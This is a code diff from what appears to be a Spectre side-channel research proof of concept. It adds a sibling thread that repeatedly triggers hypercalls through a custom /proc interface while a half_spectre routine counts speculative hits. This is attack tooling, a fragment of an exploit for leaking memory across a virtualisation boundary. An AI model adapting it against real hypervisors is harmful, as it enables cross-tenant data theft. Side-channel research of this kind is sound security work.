@@ -6,8 +6,13 @@
 #include <unistd.h>
 #include <sched.h>
 #include <assert.h>
+#include <pthread.h>
 #include "constants.h"
 #include "spectre.h"
+#include "timing.h"
+
+pthread_t sibling = -1;
+int sibling_stop = 0;
 
 static int half_spectre_raw(void *buf, const size_t idx, const size_t iters) {
 	static int fd_sched_yield = -1;
@@ -53,4 +58,51 @@ void half_spectre(unsigned char *p, uintptr_t pa_p, uintptr_t pa_base)
 			printf("| hits = %d / 10M\n", half_spectre_raw(p + delta_p, off/8, 10000000));
 		}
 	}
+}
+
+
+static void do_spectre_touch_base(int repeat) {
+	static struct self_send_ipi_hypercall opts = {.min = 0, .repeat = 1};
+	static int fd = -1;
+	if (fd == -1) {
+		fd = open("/proc/hypercall/self_send_ipi", O_WRONLY);
+		assert(fd > 0);
+	}
+
+	opts.repeat = repeat;
+	assert(write(fd, &opts, sizeof(opts)) != 1);
+}
+
+static void *spectre_touch_base(void *data)
+{
+	const int verbose = 1;
+	if (verbose) printf("[sibling] starting spectre_touch_base\n");
+	static int triggers = 0;
+	uint64_t start = clock_read();
+	while (!sibling_stop) {
+		do_spectre_touch_base(1000);
+		triggers += 1000;
+		if (verbose) if (triggers % 100000 == 0) {
+			double duration = (clock_read() - start) / 1000000000.0;
+			printf("[sibling] spectre_touch_base: triggers = %10d   triggers/sec: %.1f K", triggers, 0.001*triggers/duration);
+			fflush(stdout);
+			printf("\33[2K\r");
+		}
+	}
+	if (verbose) printf("[sibling] exiting spectre_touch_base\n");
+	return NULL;
+}
+
+void spectre_touch_base_start(void)
+{
+	if (sibling == -1LU) {
+		sibling_stop = 0;
+		assert(pthread_create(&sibling, NULL, spectre_touch_base, NULL) == 0);
+	}
+}
+
+void spectre_touch_base_stop(void)
+{
+	sibling_stop = 1;
+	assert(pthread_join(sibling, NULL) == 0);
 }
